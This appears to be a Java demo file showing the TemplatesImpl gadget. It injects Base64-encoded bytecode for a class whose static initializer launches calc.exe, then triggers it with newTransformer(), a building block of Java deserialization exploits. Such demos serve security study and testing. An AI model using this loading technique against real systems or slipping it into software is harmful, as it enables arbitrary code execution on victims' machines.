package org.example.load;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.TransformerConfigurationException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

public class HelloTemplatesImpl {
    public static void main(String[] args) throws TransformerConfigurationException {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANwoADAAbCQAcAB0IAB4KAB8AIAoAIQAiCAAjCgAhACQHACUHACYKAAkAJwcAKAcAKQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAqAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAJQEAClNvdXJjZUZpbGUBABBDYWxjRXhhbXBsZS5qYXZhDAANAA4HACsMACwALQEADENhbGMgRXhhbXBsZQcALgwALwAwBwAxDAAyADMBAAhjYWxjLmV4ZQwANAA1AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAANADYBAAtDYWxjRXhhbXBsZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACwAMAAAAAAAEAAEADQAOAAEADwAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABABAAAAAOAAMAAAARAAQAEgAMABMAAQARABIAAgAPAAAAGQAAAAMAAAABsQAAAAEAEAAAAAYAAQAAABgAEwAAAAQAAQAUAAEAEQAVAAIADwAAABkAAAAEAAAAAbEAAAABABAAAAAGAAEAAAAdABMAAAAEAAEAFAAIABYADgABAA8AAABUAAMAAQAAABe4AAUSBrYAB0unAA1LuwAJWSq3AAq/sQABAAAACQAMAAgAAgAQAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFwAAAAcAAkwHABgJAAEAGQAAAAIAGg==");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "CalcExample");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        obj.newTransformer();
    }

    private static void setFieldValue(Object obj, String propertyName, Object value) {
        try {
            // 获取对象的类
            Class<?> clazz = obj.getClass();
            // 获取指定名称的属性
            Field field = clazz.getDeclaredField(propertyName);
            // 设置属性的访问权限
            field.setAccessible(true);
            // 设置属性值
            field.set(obj, value);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }
}
